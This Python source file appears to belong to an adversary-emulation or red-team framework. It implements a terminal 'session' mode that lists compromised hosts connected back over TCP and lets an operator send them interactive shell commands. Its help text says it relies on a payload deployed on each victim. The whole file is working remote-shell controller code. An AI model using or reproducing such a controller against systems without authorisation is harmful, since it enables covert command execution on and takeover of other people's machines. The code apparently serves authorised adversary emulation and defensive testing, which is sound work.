import socket
import struct

from aioconsole import ainput
from app.terminal.mode import Mode


class Session(Mode):

    def __init__(self, services, logger):
        super().__init__(services, logger)
        self.sessions = []
        self.addresses = []

    async def execute(self, cmd):
        await self.execute_mode(cmd)

    async def info(self):
        print('SESSION allows you to view and enter compromised hosts')
        print('** This mode requires the (stockpile) tcp_client.py payload to be deployed on a compromised host')
        print('-> search: list all active sessions')
        print('-> pick: jump into an active session')

    async def search(self):
        active = []
        for i, conn in enumerate(self.sessions):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
                active.append(dict(index=i, address=self.addresses[i]))
            except socket.error:
                del self.sessions[i]
                del self.addresses[i]
        self.log.console_table(active)

    async def pick(self, i):
        await self._send_target_commands(int(i.split(' ')[-1]))

    async def _send_target_commands(self, target):
        conn = self.sessions[target]
        conn.send(str.encode(' '))
        self.log.console('Entered session - try "whoami"')
        while True:
            try:
                cwd_bytes = await self._read_command_output(conn)
                cwd = str(cwd_bytes, 'utf-8')
                print(cwd, end='')

                cmd = await ainput()
                if not cmd:
                    cmd = ' '
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = await self._read_command_output(conn)
                    client_response = str(cmd_output, 'utf-8')
                    print(client_response, end='')

                    if cmd == 'cd':
                        continue
                    if cmd == 'background':
                        print('\n')
                        break
            except Exception as e:
                self.log.console('Connection was dropped', 'red')
                break

    async def _read_command_output(self, conn):
        raw_msg_len = await self._recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        return await self._recvall(conn, msg_len)

    @staticmethod
    async def _recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data
